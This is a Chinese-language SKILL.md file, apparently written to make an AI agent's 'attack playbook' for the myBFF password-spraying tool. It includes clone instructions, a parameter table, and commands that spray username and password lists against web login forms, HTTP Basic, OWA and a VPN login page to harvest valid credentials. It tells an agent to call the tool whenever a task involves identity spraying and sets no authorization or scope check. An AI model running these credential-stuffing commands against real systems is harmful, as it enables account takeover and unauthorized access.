---
name: mybff-login-brute
description: 渗透工具 skill:myBFF 的安装、参数速查与攻击场景 playbook。当任务涉及 云与身份喷洒 需要调用 myBFF 时使用。
when-to-use: 渗透工具 skill:myBFF 的安装、参数速查与攻击场景 playbook。当任务涉及 云与身份喷洒 需要调用 myBFF 时使用。
---

# myBFF

- 攻击大类:C28 云与身份喷洒
- 上游仓库:https://github.com/MooseDojo/myBFF
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/MooseDojo/myBFF && cd myBFF
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python myBFF.py -u users.txt -p pass.txt -t https://t.com/login -m form` | Web 表单喷洒 |
| `-m basic` | HTTP Basic |
| `-m owa` | OWA |
| `-t 5` | 线程 |

## 攻击场景 Playbook

### Web 登录批量撞库

```bash
python myBFF.py -u emails.txt -p 'Pass1' -t https://vpn.t.com/login -m form
# 命中后输出有效凭据
```

## 注意事项

Web 认证表单喷洒框架,自动识别登录字段+错误判定,支持 Basic/OWA/Citrix 等模板。
